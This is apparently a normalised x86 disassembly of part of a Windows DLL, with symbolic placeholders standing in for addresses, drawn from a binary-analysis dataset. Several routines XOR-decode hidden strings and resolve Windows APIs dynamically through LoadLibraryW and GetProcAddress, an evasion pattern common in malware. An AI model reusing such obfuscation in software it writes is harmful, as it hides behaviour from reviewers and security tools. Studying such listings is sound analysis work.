mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
test ebx ebx
je r-xdata
push r--data
push ebx
call edi
push eax
call esi
mov [ rw-data ] eax
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn
mov eax [ rw-data ]
cmp eax [ ebp - 0x18 ]
je r-xdata
call edi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
lea ecx [ ebp - 0x24 ]
push ecx
push 0xc
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
push eax
call ebx
test eax eax
je r-xdata
push [ ebp - 0x14 ]
call eax
mov [ ebp - 0x14 ] eax
test [ ebp - 0x8 ] 0x1
jne r-xdata
sub_100513e0
push ebp
mov ebp esp
push 0xffffffff
push sub_10081f82
mov eax [ fs : 0x0 ]
push eax
sub esp 0x40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor edi edi
mov [ ebp - 0x4c ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x104 ]
cmp eax edi
je r-xdata
push edi
xor edx edx
push r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x2c ] dx
call sub_100531b0
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
mov ebx 0x2
push 0xffffffff
xor ecx ecx
add eax 0x20
push edi
mov [ ebp - 0x48 ] cx
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x34 ] 0x7
mov [ ebp - 0x38 ] edi
call sub_10019180
lea eax [ ebp - 0x48 ]
mov [ ebp - 0x4 ] edi
lea ebx [ edi + 0x1 ]
jmp r-xdata
test bl 0x1
je r-xdata
and ebx 0xfffffffd
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] edi
mov [ esi ] cx
push eax
mov ecx esi
mov [ ebp - 0x4c ] ebx
call sub_10036380
or ebx 0x4
test bl 0x2
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x34 ] 0x8
jb r-xdata
xor eax eax
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x2c ] ax
mov edx [ ebp - 0x2c ]
push edx
call sub_1006591f
add esp 0x4
mov ecx [ ebp - 0x48 ]
push ecx
call sub_1006591f
add esp 0x4
sub_1005154d
push 0x28
mov eax sub_1007f2ec
call sub_100097c8
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x4
pop eax
call sub_1004db01
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x10
call sub_10055606
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10039680
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_1004d460
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_1000a66f
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_100515d7
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_1006a508
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x80
lea eax [ ebp - 0x10 ]
push eax
push 0x80
push [ ebp + 0x8 ]
call sub_1001116c
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_10051630
push ebp
mov ebp esp
sub esp 0x8
push esi
mov esi ecx
mov edx [ esi + 0x4 ]
mov ecx [ edx + 0x4 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov ecx [ esi + 0x4 ]
mov [ ebp - 0x4 ] edx
cmp edx ecx
je r-xdata
push edi
mov edi [ ebx ]
mov [ ebp - 0x8 ] ecx
lea ecx [ ebp - 0x8 ]
mov ecx [ ecx ]
mov [ eax ] ecx
pop esi
mov esp ebp
pop ebp
retn
mov esi [ ebx ]
cmp esi [ edx + 0xc ]
jb r-xdata
mov edx ecx
mov ecx [ ecx ]
mov ecx [ ecx + 0x8 ]
jmp r-xdata
lea ecx [ ebp - 0x4 ]
mov ecx [ ecx ]
mov [ eax ] ecx
pop esi
mov esp ebp
pop ebp
retn
cmp [ ecx + 0xc ] edi
jae r-xdata
pop edi
cmp [ ecx + 0x15 ] 0x0
je r-xdata
sub_10051690
push ebp
mov ebp esp
sub esp 0x24
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
xor eax eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x14 ] ecx
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov [ ebp + 0x8 ] eax
mov al 0x38
xor [ ebp + 0x8 ] al
xor [ ebp + 0x9 ] al
xor [ ebp + 0xa ] al
xor [ ebp + 0xb ] al
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov edx [ ebp + 0x1c ]
lea ecx [ ebp - 0x24 ]
push ecx
mov [ ebp - 0x24 ] 0x8
mov [ ebp - 0x4 ] edx
call [ ebp + 0x8 ]
mov eax [ ebp - 0x1c ]
mov esp ebp
pop ebp
retn 0x18
sub_100516ef
mov edi edi
push esi
push edi
mov esi ecx
call sub_1002ebf8
mov edi eax
test edi edi
je r-xdata
mov esi [ esi + 0x4 ]
mov eax esi
test esi esi
jne r-xdata
lea ecx [ esi + 0x4 ]
push edi
call sub_10055040
push edi
call sub_10022b5a
pop ecx
pop edi
pop esi
retn
mov eax r--data
sub_10051730
push ebp
mov ebp esp
push 0xffffffff
push sub_1008098b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x38
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
test eax eax
je r-xdata
mov eax 0x2
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push 0x18
call sub_10055606
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] ebx
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x44 ]
call sub_10039680
add eax 0x1c
mov eax ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xffffffff
mov [ ecx ] esi
test bl 0x1
je r-xdata
push eax
lea ecx [ ebp - 0x44 ]
call sub_1004d460
lea ecx [ ebp - 0x20 ]
push ecx
mov ebx 0x1
mov [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_10045e45
mov edx [ eax ]
mov [ esi + 0x8 ] edx
mov ecx [ eax + 0x4 ]
mov [ esi + 0xc ] ecx
mov edx [ eax + 0x8 ]
mov [ esi + 0x10 ] edx
mov eax [ eax + 0xc ]
add esp 0x4
mov [ esi + 0x14 ] eax
jmp r-xdata
sub_10051809
mov edi edi
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1006591f
pop ecx
sub_1005182b
mov edi edi
push ebp
mov ebp esp
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
push eax
push r--data
lea eax [ ebp - 0x44 ]
push 0x40
push eax
mov ebx ecx
call sub_10010183
push eax
lea eax [ ebp - 0x44 ]
push eax
push [ ebp + 0x18 ]
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push ebx
call sub_10015817
mov ecx [ ebp - 0x4 ]
add esp 0x30
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn 0x18
sub_10051890
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp edi esi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
mov eax [ edi + 0x8 ]
mov [ esi + 0x8 ] eax
mov ecx [ edi + 0x28 ]
push 0xffffffff
mov [ esi + 0x28 ] ecx
mov edx [ edi + 0x48 ]
push 0x0
lea eax [ edi + 0x2c ]
push eax
lea ecx [ esi + 0x2c ]
mov [ esi + 0x48 ] edx
call sub_10019180
mov ecx [ edi + 0x4c ]
mov [ esi + 0x4c ] ecx
mov edx [ edi + 0x50 ]
mov [ esi + 0x50 ] edx
mov eax [ edi + 0x58 ]
mov [ esi + 0x58 ] eax
mov ecx [ edi + 0x5c ]
mov [ esi + 0x5c ] ecx
mov edx [ edi + 0x68 ]
mov [ esi + 0x68 ] edx
mov eax [ edi + 0x6c ]
mov [ esi + 0x6c ] eax
sub_100518ec
mov edi edi
push ebp
mov ebp esp
sub esp 0x54
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x44 ] 0x0
and [ ebp - 0x48 ] 0x0
push esi
mov esi [ ebp + 0x20 ]
push edi
mov edi [ ebp + 0x8 ]
lea edx [ ebp - 0x44 ]
push edx
lea edx [ ebp - 0x48 ]
push edx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push ecx
call sub_1004a589
add esp 0x18
push eax
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_1001d665
fstp [ ebp - 0x54 ]
mov eax [ ebp - 0x48 ]
add esp 0x10
test eax eax
je r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081b8
test al al
je r-xdata
fld [ ebp - 0x54 ]
shl eax 0x2
push eax
push ecx
push ecx
fstp [ esp ]
call sub_1003fe0d
fstp [ ebp - 0x54 ]
add esp 0xc
lea eax [ ebp - 0x40 ]
cmp [ ebp - 0x4c ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x44 ] 0x0
jne r-xdata
fld [ ebp - 0x54 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn 0x20
sub_100519b0
push ebp
mov ebp esp
sub esp 0xbc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
mov [ ebp - 0xbc ] ebx
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0xb8 ] ebx
mov ebx [ ebp + 0x20 ]
push ebx
mov ebx [ ebp + 0x1c ]
push ebx
mov ebx [ ebp - 0xb8 ]
push ebx
mov ebx [ ebp - 0xbc ]
push ebx
push edi
push ecx
push eax
mov eax [ ebp + 0x8 ]
push eax
push esi
call sub_10057560
xor edi edi
mov [ esi ] r--data
mov [ esi + 0xb8 ] 0x0
mov [ esi + 0xbc ] edi
mov [ esi + 0xc0 ] edi
mov [ esi + 0xc4 ] edi
mov ecx [ r--data ]
xor eax eax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffda
and edx 0xff
mov [ ebp + eax * 2 - 0x3c ] dx
inc eax
cmp eax 0xb
jb r-xdata
lea ecx [ ebp - 0x3c ]
xor eax eax
push ecx
mov [ ebp - 0x26 ] ax
call [ LoadLibraryW@IAT ]
mov [ esi + 0xbc ] eax
cmp eax edi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
mov eax esi
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn 0x1c
mov edi [ r--data ]
xor dl dl
xor ecx ecx
mov bl [ ecx + edi ]
xor bl dl
xor bl 0x89
inc dl
mov [ ebp + ecx - 0x14 ] bl
movzx ecx dl
cmp ecx 0xd
jb r-xdata
mov ebx [ GetProcAddress@IAT ]
lea edx [ ebp - 0x14 ]
push edx
push eax
mov [ ebp - 0x7 ] 0x0
call ebx
mov [ esi + 0xc8 ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0xa0 ]
mov eax 0x1d
call sub_10040db0
mov ecx [ esi + 0xbc ]
mov eax edi
push eax
push ecx
call ebx
mov [ esi + 0xcc ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0x78 ]
mov eax 0x53
call sub_10040db0
mov eax [ esi + 0xbc ]
mov edx edi
push edx
push eax
call ebx
mov [ esi + 0xd0 ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0x50 ]
mov eax 0x69
call sub_10040db0
mov edx [ esi + 0xbc ]
mov ecx edi
push ecx
push edx
call ebx
mov [ esi + 0xd4 ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0xb4 ]
mov eax 0x5a
call sub_10040db0
mov ecx [ esi + 0xbc ]
mov eax edi
push eax
push ecx
call ebx
mov [ esi + 0xd8 ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0x24 ]
mov eax 0x6c
call sub_10040db0
mov eax [ esi + 0xbc ]
mov edx edi
push edx
push eax
call ebx
mov [ esi + 0xdc ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0x8c ]
mov eax 0x37
call sub_10040db0
mov edx [ esi + 0xbc ]
mov ecx edi
push ecx
push edx
call ebx
mov [ esi + 0xe0 ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0x64 ]
mov eax 0x4c
call sub_10040db0
mov ecx [ esi + 0xbc ]
mov eax edi
push eax
push ecx
call ebx
mov [ esi + 0xe4 ] eax
test eax eax
je r-xdata
mov [ esi + 0xb8 ] 0x1
sub_10051bd0
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffbb
and edx 0xff
mov [ ebp + eax * 2 - 0x10 ] dx
inc eax
cmp eax 0x5
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x6 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffd4
and edx 0xff
mov [ ebp + eax * 2 - 0x28 ] dx
inc eax
cmp eax 0x5
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x1e ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffe0
and edx 0xff
mov [ ebp + eax * 2 - 0x1c ] dx
inc eax
cmp eax 0x4
jb r-xdata
push ebx
push esi
mov esi [ lstrlenW@IAT ]
push edi
lea ecx [ ebp - 0x1c ]
xor eax eax
push ecx
mov [ ebp - 0x14 ] ax
call esi
lea edx [ ebp - 0x28 ]
push edx
mov edi eax
call esi
add edi eax
lea eax [ ebp - 0x10 ]
push eax
call esi
add eax edi
lea ecx [ eax + eax + 0x6 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
call esi
add eax eax
push eax
lea eax [ ebp - 0x10 ]
push eax
push ebx
call sub_100796a0
add esp 0xc
lea ecx [ ebp - 0x10 ]
push ecx
call esi
push r--data
mov edi eax
call esi
add eax eax
push eax
lea edx [ ebx + edi * 2 ]
push r--data
push edx
call sub_100796a0
add esp 0xc
push r--data
call esi
add edi eax
lea eax [ ebp - 0x28 ]
push eax
call esi
add eax eax
push eax
lea ecx [ ebp - 0x28 ]
push ecx
lea edx [ ebx + edi * 2 ]
push edx
call sub_100796a0
add esp 0xc
lea eax [ ebp - 0x28 ]
push eax
call esi
push r--data
add edi eax
call esi
add eax eax
push eax
lea ecx [ ebx + edi * 2 ]
push r--data
push ecx
call sub_100796a0
add esp 0xc
push r--data
call esi
lea edx [ ebp - 0x1c ]
push edx
add edi eax
call esi
add eax eax
push eax
lea eax [ ebp - 0x1c ]
push eax
lea ecx [ ebx + edi * 2 ]
push ecx
call sub_100796a0
mov ecx [ ebp - 0x4 ]
add esp 0xc
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub_10051d6b
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_1006a508
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x107
lea eax [ ebp - 0x10 ]
push eax
push 0x107
push [ ebp + 0x8 ]
call sub_1001116c
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_10051dd0
mov edi edi
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
mov [ esi ] r--data
test eax eax
je r-xdata
mov esi [ esi + 0xc ]
test esi esi
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
pop esi
retn
push esi
call [ LocalFree@IAT ]
sub_10051dfe
mov edi edi
push esi
push [ rw-data ]
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push [ rw-data ]
call [ DecodePointer@IAT ]
mov esi eax
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
sub_10051e5b
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_1006a508
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8
lea eax [ ebp - 0x10 ]
push eax
push 0x8
push [ ebp + 0x8 ]
call sub_1001116c
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_10051eb0
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp edi esi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
mov eax edi
call sub_1003be70
push 0xffffffff
push 0x0
lea eax [ edi + 0x94 ]
push eax
lea ecx [ esi + 0x94 ]
call sub_10019180
mov ecx [ edi + 0xb0 ]
mov [ esi + 0xb0 ] ecx
mov edx [ edi + 0x90 ]
mov [ esi + 0x90 ] edx
sub_10051efb
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x14 ]
push edi
push [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
push [ ebp + 0x1c ]
mov ebx ecx
push eax
push r--data
lea eax [ ebp - 0xc ]
push eax
push ebx
call sub_10037958
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_10010183
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_1004fd82
mov ecx [ ebp - 0x4 ]
add esp 0x34
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn 0x1c
sub_10051f90
push ebp
mov ebp esp
sub esp 0x258
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x258 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov [ ebp - 0x254 ] eax
test eax eax
jne r-xdata
push ebx
push esi
push edi
mov edi edi
lea edx [ ebp - 0x34 ]
mov eax 0xd1
call sub_100050e0
mov eax 0x1
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
test ebx ebx
jne r-xdata
push 0x5c
push ebx
call sub_10030ad6
add esp 0x8
lea ebx [ eax + 0x2 ]
push 0x208
lea eax [ ebp - 0x250 ]
push 0x0
push eax
call sub_10079a10
mov ecx [ ebp - 0x258 ]
mov edx [ ecx ]
mov esi [ edx + 0x14 ]
push 0x2e
push esi
call sub_10030ad6
mov edi eax
add esp 0x14
test edi edi
je r-xdata
xor eax eax
mov edi edi
lea edx [ ebp - 0x48 ]
mov eax 0xec
call sub_100050e0
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn
sub eax esi
sar eax 0x1
add eax eax
push eax
lea ecx [ ebp - 0x250 ]
push esi
push ecx
call sub_100796a0
mov ecx [ r--data ]
add esp 0xc
xor eax eax
lea ecx [ ecx ]
inc eax
cmp eax 0x18
jb r-xdata
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x68
and edx 0xff
mov [ ebp + eax * 2 - 0xc ] dx
inc eax
cmp eax 0x2
jb r-xdata
mov esi [ lstrcatW@IAT ]
lea ecx [ ebp - 0xc ]
push ecx
lea edx [ ebp - 0x250 ]
xor eax eax
push edx
mov [ ebp - 0x8 ] ax
call esi
push edi
lea eax [ ebp - 0x250 ]
push eax
call esi
push ebx
lea ecx [ ebp - 0x250 ]
push ecx
call [ lstrcmpW@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x254 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x254 ] eax
test eax eax
jne r-xdata
mov edx [ ebp - 0x254 ]
mov eax [ edx ]
mov ecx [ ebp - 0x258 ]
mov edx [ ecx ]
mov [ edx + 0x50 ] eax
inc [ eax + 0x1c ]
mov ecx [ ebp - 0x254 ]
mov edx [ ecx ]
mov ebx [ edx + 0x4 ]
push 0x5c
push ebx
call sub_10030ad6
add esp 0x8
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub_10052120
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp [ eax + 0x8 ] 0x0
jbe r-xdata
pop ebp
retn
mov eax [ eax ]
mov ecx [ ebp + 0x8 ]
push eax
push ecx
call sub_10035fe0
add esp 0x8
sub_1005213d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
pop ebp
retn
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
push 0x16
pop eax
pop ebp
retn
sub_100521d0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10039cb0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1006591f
add esp 0x4
sub_10052200
push ebp
mov ebp esp
push 0xffffffff
push sub_10080818
mov eax [ fs : 0x0 ]
push eax
sub esp 0x60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ esi ]
lea eax [ ebp - 0x58 ]
push eax
mov [ ebp - 0x5c ] esi
mov [ ebp - 0x58 ] 0x0
call sub_10036d40
mov [ ebp - 0x60 ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x58 ]
push 0x4
push 0x0
mov [ ebp - 0x68 ] ecx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
lea edx [ ebp - 0x54 ]
mov eax 0x1c
call sub_100050e0
mov ecx [ ebp - 0x58 ]
test ecx ecx
je r-xdata
xor esi esi
mov [ eax ] 0x0
mov esi eax
jmp r-xdata
mov eax [ esi ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0x60 ]
mov [ esi ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
jmp r-xdata
mov ecx [ ebp - 0x58 ]
mov eax [ edi + 0x4 ]
dec [ eax ]
cmp [ eax ] 0x0
jne r-xdata
inc [ esi ]
mov [ ebp - 0x64 ] esi
lea edx [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x0
cmp edi edx
je r-xdata
mov esi [ ebp - 0x5c ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x58 ]
mov [ edi ] ecx
mov [ edi + 0x4 ] esi
inc [ esi ]
jmp r-xdata
mov ecx [ edi ]
test ecx ecx
je r-xdata
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov [ ebp - 0x4 ] 0xffffffff
dec [ esi ]
jne r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_1005233d
mov edi edi
push esi
push edi
push 0x0
mov esi ecx
call sub_1002af40
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
and [ esi + 0x28 ] 0x0
test eax eax
je r-xdata
mov edi [ eax ]
push eax
call sub_1006591f
pop ecx
mov eax edi
test edi edi
jne r-xdata
and [ esi + 0x2c ] 0x0
pop edi
pop esi
retn
mov edi [ eax ]
push eax
call sub_1006591f
pop ecx
mov eax edi
test edi edi
jne r-xdata
sub_10052381
push 0x60
mov eax sub_1007f8e7
call sub_1001bb6b
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
or [ ebp - 0x50 ] 0xffffffff
mov [ ebp - 0x68 ] eax
mov eax [ ebp + 0x20 ]
xor ebx ebx
mov [ ebp - 0x58 ] eax
mov eax [ ebp + 0x24 ]
inc ebx
test [ esi + 0x14 ] 0x4000
mov [ ebp - 0x54 ] ecx
mov [ ebp - 0x6c ] eax
mov ecx esi
je r-xdata
lea eax [ ebp - 0x60 ]
xor edi edi
push eax
mov [ ebp - 0x5c ] edi
call sub_100688a0
mov esi [ esi + 0x14 ]
lea ecx [ ebp - 0x5c ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x54 ]
mov [ ebp - 0x4 ] 0x4
call sub_10030ef2
add esp 0x18
push eax
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10058a63
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x60 ]
mov esi eax
call sub_10069ce0
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x64 ] eax
je r-xdata
lea eax [ ebp - 0x54 ]
push eax
call sub_100688a0
xor edi edi
push eax
mov [ ebp - 0x4 ] edi
call sub_1001fccb
pop ecx
or esi 0xffffffff
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4 ] esi
call sub_10069ce0
push edi
xor eax eax
push ebx
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x38 ] 0x7
mov [ ebp - 0x3c ] edi
mov [ ebp - 0x4c ] ax
call sub_1005d0d7
mov ecx [ ebp - 0x50 ]
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x4 ] ebx
call sub_10028071
push esi
push edi
push eax
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x2
call sub_1001e620
push edi
push ebx
